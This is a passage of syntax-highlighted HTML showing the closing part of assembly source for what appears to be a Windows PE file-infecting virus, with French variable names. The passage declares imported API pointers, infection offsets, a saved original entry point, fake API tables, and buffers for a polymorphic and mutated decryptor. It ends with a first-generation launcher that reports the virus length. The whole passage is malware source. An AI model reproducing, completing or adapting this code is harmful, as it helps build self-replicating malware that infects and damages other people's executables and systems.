</span><span class="sc5">SetFileAttributes</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Sleep</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">UMVOFile</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">VProtect</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">; USER32.DLL</span><span class="sc0">
</span><span class="sc5">apis_u32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">MessageBox</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">; ADVAPI32.DLL</span><span class="sc0">
</span><span class="sc5">apis_a32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">CAcquireContextA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CCreateHash</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CDecrypt</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CDeriveKey</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CEncrypt</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CHashData</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">



</span><span class="sc1">;DIVERS</span><span class="sc0">
</span><span class="sc5">lst_fnc</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">lst_ord</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">lst_noms</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Fhandle</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Mhandle</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Shandle</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">WFD</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftCreationTime</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastAccessTime</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved0</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_szFileName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WFD_szAlternateFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SavedDirectory</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Buffer</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Buffer2</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">infection_raw</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">virus_start_va</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">iat_noms_apis_rva</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">iat_noms_apis_raw</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">taille_virus_alignee</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sfc_protected</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">calc_chksum</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">checksum</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">old_checksum</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">fonction_encryption</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">poly_decrypteur</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">poly_name_dll</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">poly_liste_apis_compat</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">poly_nb_apis_compat</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">poly_buffer</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">simple_cle</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">vtmp1</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">vtmp2</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">vtmp3</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">vtmp4</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">index_iat</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">MAX_APIS_IMPORTEES</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">relocated_imagebase</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">is_relocated</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;=================== VARIABLES SAUVEGARDEES =================</span><span class="sc0">
</span><span class="sc5">sauvegarde</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">sauve_ancien_ep</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sauve_imagebase</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">s_a32_oft</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">s_a32_ft</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sauve_locations</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">MAX_NB_PARTIES</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sauve_infection_rva</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sauve_nb_parties</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">; FAKE APIS</span><span class="sc0">
</span><span class="sc5">sauve_fake_apis</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">NB_FAKE_APIS</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sauve_nb_fake_apis</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">; FUSION IMORTS</span><span class="sc0">


</span><span class="sc1">;=================== VARIABLES ALLOUEES =================</span><span class="sc0">
</span><span class="sc5">variables_allouees</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">decrypteur</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mutated_pseudo_decrypteur</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">adresses_interdites</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">xor_loop_location</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">heap_len</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">debut_virus</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_len</span><span class="sc0">





</span><span class="sc1">;================= PREMIERE GENERATION ==================</span><span class="sc0">




</span><span class="sc5">first_gen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_len</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printdec</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">printdec</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">              </span><span class="sc1">;c vite-fait ...</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">buf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">GUI_printdec_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GUI_printdec_1</span><span class="sc0">
</span><span class="sc5">GUI_prindec_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">48</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">GUI_prindec_2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Signature</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">printdec</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">buf</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">


</span></div></body>
</html>
